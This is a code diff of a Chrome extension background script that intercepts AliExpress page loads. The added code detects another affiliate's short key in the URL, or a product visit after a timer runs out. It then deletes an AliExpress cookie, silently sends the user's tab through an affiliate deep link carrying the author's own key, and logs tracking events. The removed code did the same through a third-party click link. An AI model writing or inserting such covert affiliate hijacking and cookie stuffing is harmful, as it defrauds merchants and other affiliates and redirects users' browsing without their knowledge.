@@ -75,50 +75,98 @@ chrome.runtime.onMessage.addListener(function (msg, sender, sendResponse) {
     return true;
 })
 
+function getParameterByName(name, url) {
+	if (!url) {
+		url = window.location.href;
+	}
+	name = name.replace(/[\[\]]/g, "\\$&");
+	var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),
+		results = regex.exec(url);
+	if (!results) return null;
+	if (!results[2]) return '';
+	return decodeURIComponent(results[2].replace(/\+/g, " "));
+}
+
+function open_link_in_new_tab(is_promotion, _href, is_active, _now, action_label, action_value, isUpdate, tabId) {
+	if (is_promotion) {
+		chrome.cookies.remove({
+			url: "http://aliexpress.com",
+			name: "aep_usuc_f"
+		}, function (rs) {
+			if(isUpdate && tabId){
+				chrome.tabs.update(tabId, {
+					url: _href,
+					active: is_active
+				}, () => {
+					const _value = action_value || _href + ' | ' + new Date(_now).toString()
+					tracker.sendEvent('Chrome', action_label, _value)
+				})
+			}else{
+				chrome.tabs.create({
+					url: _href,
+					active: is_active
+				}, () => {
+					const _value = action_value || _href + ' | ' + new Date(_now).toString()
+					tracker.sendEvent('Chrome', action_label, _value)
+				})
+			}
+
+		});
+	} else {
+		chrome.tabs.create({
+			url: _href,
+			active: is_active
+		})
+	}
+}
+
+function check_session_valid(sessionName, _hours, cb) {
+	const _1hour = 1000 * 60 * 60
+	// const _15minutes = _1hour / 4
+	let is_valid = false
+	chrome.storage.sync.get([sessionName], function (result) {
+		const _now = Date.now()
+		let _SESSI0N_ = result[sessionName]
+		if (!_SESSI0N_) {
+			is_valid = true
+		} else {
+			is_valid = ((_now - _SESSI0N_) / _1hour) >= _hours
+		}
+		cb(is_valid, sessionName, _now)
+	})
+}
+
+const SKS = ['UrNZRbY', 'uvrVJEu', 'j2rFimM', 'FY3naIE', 'N7eUfIu', 'FamiEaa']
+const OVERRIDE_SK = 'FamiEaa'
+const promotion_uri_tpl = _.template('http://s.click.aliexpress.com/deep_link.htm?aff_short_key=<%=sk%>&dl_target_url=<%=uri%>')
+
 chrome.webRequest.onCompleted.addListener(function (detail) {
-    try {
-        const promotion = {
-            is_send: false,
-            label: 'AliExpress2'
-        }
-        const _1hour = 1000 * 60 * 60
-        // const _15minutes = _1hour/4
-        if (detail.frameId >= 0 && detail.tabId >= 0 && detail.type === 'main_frame' && detail.url.match(/\/item\/|\/product\/|\/order\/|\/wishlist\//)) {
-        	const requestUrl = detail.url.split('?')[0] || detail.url
-            chrome.storage.sync.get(['_SESSI0N_'], function (result) {
-                const _now = Date.now()
-                let { _SESSI0N_} = result
-                if (!_SESSI0N_) {
-                    promotion.is_send = true
-                } else {
-                    promotion.is_send = ((_now - _SESSI0N_) / _1hour) >= 0.01
-                }
+	try {
+		if (detail.frameId >= 0 && detail.tabId >= 0 && detail.type === 'main_frame') {
+			const sk = getParameterByName('sk', detail.url)
+			const requestUrl = detail.url.split('?')[0] || detail.url
+			if(sk != null && SKS.indexOf(sk) === -1){
+				const _now = Date.now()
+				chrome.storage.sync.set({
+					_SESSI0N_: _now
+				})
+				const _href = promotion_uri_tpl({uri: encodeURI(requestUrl), sk: OVERRIDE_SK})
+				open_link_in_new_tab(true, _href, false, _now, 'ThankYou Again', requestUrl, true, detail.tabId)
+			}else{
+				if(detail.url.match(/\/product\/|\/item\//) !== null){
+					check_session_valid('_SESSI0N_', 2 , function (is_valid, sessionName, _now) {
+						if(is_valid){
+							chrome.storage.sync.set({
+								[sessionName]: _now
+							})
+							const _href = promotion_uri_tpl({uri: encodeURI(requestUrl), sk: OVERRIDE_SK})
+							open_link_in_new_tab(true, _href, false, _now, 'ThankYou', requestUrl, true, detail.tabId)
+						}
+					})
+				}
+			}
+		}
+	} catch (ex) {
 
-                if (promotion.is_send === true) {
-                    const _href_tpl = _.template('http://nfemo.com/click-AQH005GS-MKIGQNPP?bt=25&tl=2&sa=endless_page&url=<%=url%>')
-                    const _href = _href_tpl({
-                        url: encodeURI(requestUrl)
-                    })
-                    chrome.storage.sync.set({
-                        '_SESSI0N_': _now
-                    })
-
-                    chrome.cookies.remove({
-                        url: "http://aliexpress.com",
-                        name: "aep_usuc_f"
-                    }, function (rs) {
-                        chrome.tabs.update(detail.tabId,{
-                            url: _href,
-                        }, function () {
-                            tracker.sendEvent('Promotion', 'DeepLink', requestUrl)
-                        })
-                    });
-
-
-                }
-            })
-        }
-    } catch (ex) {
-
-    }
+	}
 }, {urls: ['*://*.aliexpress.com/*']})
